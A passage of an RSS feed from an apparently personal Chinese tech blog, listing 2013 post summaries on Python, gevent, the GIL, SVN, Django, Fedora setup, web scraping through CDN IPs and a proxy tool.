      <link>/posts/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%B0%E7%9A%84%E6%95%B0%E9%87%8F%E8%B6%8A%E5%A4%9A%E5%BE%97%E5%88%B0%E7%9A%84%E6%8A%98%E6%89%A3%E5%8F%8D%E8%80%8C%E4%BD%8E%E4%BA%86/</link>
      <pubDate>Fri, 08 Nov 2013 10:49:52 +0000</pubDate>
      
      <guid>/posts/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%B0%E7%9A%84%E6%95%B0%E9%87%8F%E8%B6%8A%E5%A4%9A%E5%BE%97%E5%88%B0%E7%9A%84%E6%8A%98%E6%89%A3%E5%8F%8D%E8%80%8C%E4%BD%8E%E4%BA%86/</guid>
      <description>&lt;p&gt;一个月前分析了公司的某些数据，得到下面的结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;QTY1有效数量：328907,平均折扣率为：0.199117
QTY2有效数量：328894,平均折扣率为：0.116905
QTY3有效数量：328893,平均折扣率为：0.104165
QTY4有效数量：328886,平均折扣率为：0.095405
QTY5有效数量：316263,平均折扣率为：0.084468
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第一眼看去似乎我程序算法有问题，按照常识来说，买的越多折扣应越大才对，不过从结果看来，买的越多折扣反而越少，为什么呢？&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>创业前请思考（转）</title>
      <link>/posts/%E5%88%9B%E4%B8%9A%E5%89%8D%E8%AF%B7%E6%80%9D%E8%80%83%E8%BD%AC/</link>
      <pubDate>Fri, 08 Nov 2013 08:53:21 +0000</pubDate>
      
      <guid>/posts/%E5%88%9B%E4%B8%9A%E5%89%8D%E8%AF%B7%E6%80%9D%E8%80%83%E8%BD%AC/</guid>
      <description>&lt;p&gt;这篇文章我2012年转载于其他地方，原文链接已经找不到了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>你真的会python吗?</title>
      <link>/posts/%E4%BD%A0%E7%9C%9F%E7%9A%84%E4%BC%9Apython%E5%90%97/</link>
      <pubDate>Thu, 07 Nov 2013 17:28:12 +0000</pubDate>
      
      <guid>/posts/%E4%BD%A0%E7%9C%9F%E7%9A%84%E4%BC%9Apython%E5%90%97/</guid>
      <description>声明：这篇文章转自http://www.dongwm.com/archives/ni-zhen-de-hui-pythonma/，我看后颇有当头棒喝之感，故收于此顺便修改几处错字，十分感谢原作者！
前言 我这个博客一直都是一些技术分享,show code的地方，我从来没有写过个人生活或者情感杂谈,当然我也从来没有谈论过我对什么东西的喜恶. 很多人喜欢喷XX语言，喜欢谈论XX和YY的优缺,甚至凑了一本不知所云的书…好吧,我觉得没有使用一门语言超过10年，没有对一个技术研究个5,6年， 不好意思说自己懂(天才除外).我也觉得我没有资格讨论什么，也许我有我的观点看法，但是我怀着怀疑的心态看自己，生怕自己理解错了. 下文纯属个人吐槽,也许没有指定路怎么走，只是希望提个醒… 使用python2年，可喜的是python被越来越多的人接受，甚至前端工程师…但是却有点烂大街的感觉:感觉出门不聊几句python都不好意思和人打招呼.但是你真的懂python嘛?
你会python真的不重要 python实在太好学习了,假如你会其它的语言，可能搞本书翻一翻，一周后就能写很高端的python程序，由于web框架的普及，你甚至可以让一个网站应用跑起来. 你会我也会，你有什么竞争力?</description>
    </item>
    
    <item>
      <title>那个不嫌你穷的姑娘，为什么没陪你走到最后</title>
      <link>/posts/%E9%82%A3%E4%B8%AA%E4%B8%8D%E5%AB%8C%E4%BD%A0%E7%A9%B7%E7%9A%84%E5%A7%91%E5%A8%98%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E9%99%AA%E4%BD%A0%E8%B5%B0%E5%88%B0%E6%9C%80%E5%90%8E/</link>
      <pubDate>Thu, 07 Nov 2013 16:00:58 +0000</pubDate>
      
      <guid>/posts/%E9%82%A3%E4%B8%AA%E4%B8%8D%E5%AB%8C%E4%BD%A0%E7%A9%B7%E7%9A%84%E5%A7%91%E5%A8%98%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E9%99%AA%E4%BD%A0%E8%B5%B0%E5%88%B0%E6%9C%80%E5%90%8E/</guid>
      <description>&lt;p&gt;非诚勿扰里乐嘉老师曾发过一段微博，大意是说乐嘉老师自己初恋的时候，有一个姑娘很爱他，那时候乐嘉人又穷，又桀骜，又倔又愤，就觉得 你爱我你就应该怎样怎样的证明，最后有一天，姑娘终于跑掉了，确实跟了个有钱人，于是乐嘉就又觉得姑娘是因为嫌贫爱富，着实的去跟姑娘纠缠闹腾了一阵子。 直到很多年后的今天，乐嘉老师自己也成熟了，有钱有地位了，可以心平气和的想这段往事，才真的承认，人家姑娘当初跟他分手，不是嫌他穷。&lt;/p&gt;
&lt;p&gt;年少的时候常常想能开一辆敞篷车又带著自己喜欢的人在满是落叶的山路上慢慢开，可是现在我发现这是很难的。因为开著敞篷车的时候旁边没有自己喜欢的姑娘，而 有自己喜欢的姑娘在边上的时候又没开敞篷车，有敞篷的车和自己喜欢的姑娘的时候偏偏又只能被堵车在城里。然后随著时间过去，这样的冲动也越来越少，不像上 学的时候，觉得可以为一个姑娘付出一切——对了，甚至还有生命。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Gevent学习记录1</title>
      <link>/posts/gevent%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</link>
      <pubDate>Thu, 07 Nov 2013 15:55:48 +0000</pubDate>
      
      <guid>/posts/gevent%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</guid>
      <description>关于Gevent出现URLError: &amp;lt;urlopen error [Errno 66] unknown&amp;gt;错误：
学习的过程中，有些网址始终出现上面提示的那个错误，但用浏览器访问确实是正常的。
有网友提示说把gevent.monkey.patch_all(dns=false)，经我实验后发现，这么改过后有些网址确实变得正常了，但有些网址却出现了其它比如time out、Network is unreachable等错误。</description>
    </item>
    
    <item>
      <title>python异步任务队列、消息队列</title>
      <link>/posts/python%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</link>
      <pubDate>Thu, 07 Nov 2013 14:50:01 +0000</pubDate>
      
      <guid>/posts/python%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</guid>
      <description>&lt;p&gt;提起gevent,就不得不提起greenlet。按照官方解释greenlet是轻量级的并行编程，而gevent呢，就是利用greenlet实现的基于协程的python的网络library。&lt;/p&gt;
&lt;p&gt;官方文档：http://www.gevent.org/contents.html&lt;/p&gt;
&lt;p&gt;说说协程，进程和线程大家平时了解的都比较多，而协程算是一种轻量级进程，但又不能叫进程，因为操作系统并不知道它的存在。什么意思呢，就是说，协程像是一种在程序级别来模拟系统级别的进程，由于是单进程，并且少了上下文切换，于是相对来说系统消耗很少，而且网上的各种测试也表明，协程确实拥有惊人的速度。并且在实现过程中，协程可以用以前同步思路的写法，而运行起来确是异步的，也确实很有意思。话说有一种说法就是说进化历程是多进程-&amp;gt;多线程-&amp;gt;异步-&amp;gt;协程，暂且不论说的对不对，单从诸多赞誉来看，协程还是有必要理解一下的。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>GIL，线程，协程</title>
      <link>/posts/gil%E7%BA%BF%E7%A8%8B%E5%8D%8F%E7%A8%8B/</link>
      <pubDate>Wed, 06 Nov 2013 16:04:55 +0000</pubDate>
      
      <guid>/posts/gil%E7%BA%BF%E7%A8%8B%E5%8D%8F%E7%A8%8B/</guid>
      <description>并行与并发 并发：一个CUP运行多个程序，就好像一个人吃三个馒头。
并行：一个程序同一时刻运行在多个CUP上，就好像三个人吃一个馒头。
再从网上借用个例子：
“并行”是指无论从微观还是宏观，二者都是一起执行的，就好像两个人各拿一把铁锨在挖坑，一小时后，每人一个大坑。而“并发”在微观上不是同时执行的，只是把时间分成若干段，使多个进程快速交替的执行，从宏观外来看，好像是这些进程都在执行，这就好像两个人用同一把铁锨，轮流挖坑，一小时后，两个人各挖一个小一点的坑，要想挖两个大一点得坑，一定会用两个小时。
从以上本质不难看出，“并发”执行，在多个进程存在资源冲突时，并没有从根本提高执行效率。明白了这个区别后再往下看。
GIL 由于新的项目可能需要进行py线程级别的操作，便开始学习了python线程的相关知识。但是学习的过程中发现，由于py中GIL(解释器全局锁)的存在，线程对于py来说似乎是一个比较鸡肋的东西。
关于GIL这篇文章解释的很好：http://www.oschina.net/translate/pythons-hardest-problem?p=2#comments
既然如此，为什么py中不取消GIL呢？这篇文章给予了一定程度的解答：http://www.cnblogs.com/mindsbook/archive/2009/10/15/thread-safety-and-GIL.html</description>
    </item>
    
    <item>
      <title>SVN常用操作</title>
      <link>/posts/svn%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Fri, 01 Nov 2013 17:40:42 +0000</pubDate>
      
      <guid>/posts/svn%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</guid>
      <description>svn info 看信息snv co 地址 签出snv ci -m &amp;quot;注释&amp;quot; 提交svn diff 看不同svn stsvn upsvn add XXX创建分支 svn cp -m &amp;quot;注释&amp;quot; http://svn_server/xxx_repository/trunk http://svn_server/xxx_repository/branches/br_feature001获得分支 svn co http://svn_server/xxx_repository/branches/br_feature001合并主干上的最新代码到分支上 cd br_feature001svn merge http://svn_server/xxx_repository/trunk如果需要预览该刷新操作，可以使用svn mergeinfo命令，如：</description>
    </item>
    
    <item>
      <title>装饰器</title>
      <link>/posts/%E8%A3%85%E9%A5%B0%E5%99%A8/</link>
      <pubDate>Fri, 01 Nov 2013 17:38:24 +0000</pubDate>
      
      <guid>/posts/%E8%A3%85%E9%A5%B0%E5%99%A8/</guid>
      <description>装饰器的基础是 python 中函数也是对象，可以进行传递，可以在函数内部定义新的函数（函数内部的函数无法被单独调用）。 http://www.codecho.com/understanding-python-decorators/
# 装饰器makebold用于转换为粗体 def makebold(fn):# 结果返回该函数 def wrapper():# 插入一些执行前后的代码 return &amp;#34;&amp;lt;b&amp;gt;&amp;#34; + fn() + &amp;#34;&amp;lt;/b&amp;gt;&amp;#34;return wrapper# 装饰器makeitalic用于转换为斜体 def makeitalic(fn):# 结果返回该函数 def wrapper():# 插入一些执行前后的代码 return &amp;#34;&amp;lt;i&amp;gt;&amp;#34; + fn() + &amp;#34;&amp;lt;/i&amp;gt;&amp;#34;return wrapper@makebold@makeitalic #注意顺序很重要！！！！！ def say():return &amp;#34;hello&amp;#34;print say()#输出: &amp;lt;b&amp;gt;&amp;lt;i&amp;gt;hello&amp;lt;/i&amp;gt;&amp;lt;/b&amp;gt; # 等同于 def say():return &amp;#34;hello&amp;#34;say = makebold(makeitalic(say))print say()#输出: &amp;lt;b&amp;gt;&amp;lt;i&amp;gt;hello&amp;lt;/i&amp;gt;&amp;lt;/b&amp;gt; </description>
    </item>
    
    <item>
      <title>fedora19美化</title>
      <link>/posts/fedora19%E7%BE%8E%E5%8C%96/</link>
      <pubDate>Fri, 01 Nov 2013 17:30:06 +0000</pubDate>
      
      <guid>/posts/fedora19%E7%BE%8E%E5%8C%96/</guid>
      <description>https://extensions.gnome.org
安装 Gnome Tweak tool 调出最大化和最小化按钮以及更改主题
yum install gnome-shell-theme* 安装所有主题</description>
    </item>
    
    <item>
      <title>django-groundwork个人1.5.3修改版</title>
      <link>/posts/django-groundwork%E4%B8%AA%E4%BA%BA1-5-3%E4%BF%AE%E6%94%B9%E7%89%88/</link>
      <pubDate>Fri, 01 Nov 2013 17:05:17 +0000</pubDate>
      
      <guid>/posts/django-groundwork%E4%B8%AA%E4%BA%BA1-5-3%E4%BF%AE%E6%94%B9%E7%89%88/</guid>
      <description>django-groundwork,它不实现具体的功能，而是扩展了manage.py 的命令，使得通过命令行可以生成一些代码/文件。根据你的模型自动生成模板、view、url等。 将下载好的groundwork放到与APP同级的目录，在setting.py 中添加&#39;django-groundwork&#39;。
网上流传的都不太适合我使用的1.5.3版本，所以个人对其进行了小修改。
groundwork.py:
from django.core.management.base import BaseCommand, CommandErrorfrom django.</description>
    </item>
    
    <item>
      <title>django版本更换</title>
      <link>/posts/django%E7%89%88%E6%9C%AC%E6%9B%B4%E6%8D%A2/</link>
      <pubDate>Fri, 01 Nov 2013 16:36:35 +0000</pubDate>
      
      <guid>/posts/django%E7%89%88%E6%9C%AC%E6%9B%B4%E6%8D%A2/</guid>
      <description>如果你打算从过去的一个版本升级Django, 你需要先删除老版本的Django之后, 再安装新的版本.
如果你是通过执行命令 setup.py install 来安装 Django, 卸载的方法很简单,
只要在site-packages 目录下删除 django 目录就可以了.</description>
    </item>
    
    <item>
      <title>python中如何自定义解析域名</title>
      <link>/posts/python%E4%B8%AD%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Fri, 01 Nov 2013 16:29:10 +0000</pubDate>
      
      <guid>/posts/python%E4%B8%AD%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D/</guid>
      <description>最近要进行某网站的信息抓取工作，不过这个网站作出了一些限制：如果某IP过于频繁的访问则会把这个IP列入黑名单。
不过这个网站使用了CDN技术进行全球加速，那么访问时候只要在请求头中指定HOST，url中指定加速IP即可一定程度上缓解被封问题。
在网上找到一篇有关文章节选如下（原文链接http://www.hack0nair.me/?p=615）：
第一种解决方案是利用http数据包头部中的“Host”属性。
在发送HTTP请求的时候，数据包的头部总是会带上各种各样的属性，比如Data、Referer、Cookie等。（Quick reference to HTTP headers）
其中的Host属性是指，当前访问资源对应的主机名和端口号。</description>
    </item>
    
    <item>
      <title>fedora19源，rpmforge，fastestmirror</title>
      <link>/posts/fedora19%E6%BA%90rpmforgefastestmirror/</link>
      <pubDate>Fri, 01 Nov 2013 16:04:37 +0000</pubDate>
      
      <guid>/posts/fedora19%E6%BA%90rpmforgefastestmirror/</guid>
      <description>添加搜狐的源 进入网站http://mirrors.sohu.com/ ，在左边找到fedora目录，点击该行右边的help, 然后 下载fedora-sohu.repo和fedora-updates-sohu.repo, 放入/etc/yum.repos.d/ 运行yum makecache生成缓存
添加163的源 进入网站 http://mirrors.</description>
    </item>
    
    <item>
      <title>fedora19安装ar8161网卡驱动</title>
      <link>/posts/fedora19%E5%AE%89%E8%A3%85ar8161%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/</link>
      <pubDate>Fri, 01 Nov 2013 15:58:26 +0000</pubDate>
      
      <guid>/posts/fedora19%E5%AE%89%E8%A3%85ar8161%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/</guid>
      <description>换fedora19系统后发现网卡驱动没自动安装，解决办法如下：
内核为
$Linux 3.9.5-301.fc19.x86_64 SMP Tue Jun 11 19:39:38 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux试验了N多个驱动后发现下面这个可以用:</description>
    </item>
    
    <item>
      <title>Python常用第三方库(转载)</title>
      <link>/posts/python%E5%B8%B8%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93-%E8%BD%AC%E8%BD%BD/</link>
      <pubDate>Thu, 31 Oct 2013 09:05:39 +0000</pubDate>
      
      <guid>/posts/python%E5%B8%B8%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93-%E8%BD%AC%E8%BD%BD/</guid>
      <description>wxPython 如果你之前是 windows 程序员，用 MFC 或者 WIN32API 开发界面程序，那进入 Python 国度最好的 GUI 选择应该是 wxPython。它是 wxWidgets 的 Python Bind，与 wxWidgets 的开发完美同步，最为重要的一点是它的消息机制与 MFC 颇为相似，以前在 MFC 的经验完全可以稍作变化就套用在 wxPython 上面。在 WIN32 开发中，最讨厌的一环肯定有 WM_SIZE 消息的处，在主窗口大小变化的时候，保持控件布局在 WIN32 是一件麻烦事。这件事情 wx 解决得非常完美，它的sizer 概念可以让我轻松地在不同窗口尺寸的情况下保持完美的控件布局。另外如果你已经讨厌了 MFC 的 doc-view 模型，wx 也可以给你一个新的选择；如果你非常喜欢 doc-view 模型，放心，在 wx 中仍然可以轻松实现，以前的思想依然可以在这里发挥余热。 wxPython 有两个封装，一个 PythonCard，另一个是 dabo。前者是 wxPython 的有限封装，不支持wxPython 的全部特性，它的目标是让 wxPython 更加 Pythonic。后者比 PythonCard 要庞大不少，确切来说，它应该是一个三层架构的 C/S 模式的开发框架。如果你想开发基于数据库的应用（如 MIS、ERP 等）用 dabo 是一个不错的选择；另外，如果你之前习惯了 VB、VFP、Delphi 等 RAD 开发环境，dabo 并不比这些昂贵的工具差多少哦！</description>
    </item>
    
    <item>
      <title>Ubuntu下Gogant的简易破墙术</title>
      <link>/posts/ubuntu%E4%B8%8Bgogant%E7%9A%84%E7%AE%80%E6%98%93%E7%A0%B4%E5%A2%99%E6%9C%AF/</link>
      <pubDate>Tue, 12 Feb 2013 16:25:10 +0000</pubDate>
      
      <guid>/posts/ubuntu%E4%B8%8Bgogant%E7%9A%84%E7%AE%80%E6%98%93%E7%A0%B4%E5%A2%99%E6%9C%AF/</guid>
      <description>本来是研究CentOS下的穿墙术的，可惜不知道为什么我的CentOS里面Python版本始终升不到2.7，只好转到Ubuntu（如果你有CentOS下Python升级经验欢迎和我交流）。
Ubuntu我用的是12.10版本，安装完成后关于Python的版本问题是不用考虑了。
工具：1gogant ，我用的是2.1-0.32版本。 如果需要的可以留个邮箱什么的 话说最近这个玩意版本更新挺快的
2浏览器，自带的火狐就好。
过程：
 下载gogant后解压，现在这个版本里面已经不用自己申请什么ID了，直接使用即可。 终端里进入你解压后的gogant目录中，执行命令 # python proxy.</description>
    </item>
    
  </channel>
</rss>